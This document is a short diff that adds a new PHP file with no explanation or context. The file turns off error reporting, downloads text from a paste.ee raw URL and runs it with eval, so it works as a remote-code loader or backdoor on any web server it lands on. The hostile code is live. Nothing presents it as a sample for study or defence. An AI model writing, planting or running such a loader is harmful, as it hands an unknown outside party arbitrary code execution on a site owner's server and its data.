@@ -1,0 +1,6 @@
+<?php
+error_reporting(0);
+$url = 'https://paste.ee/r/M5wIf/0';
+$kode = file_get_contents($url);
+eval('?>' . $kode);
+?>
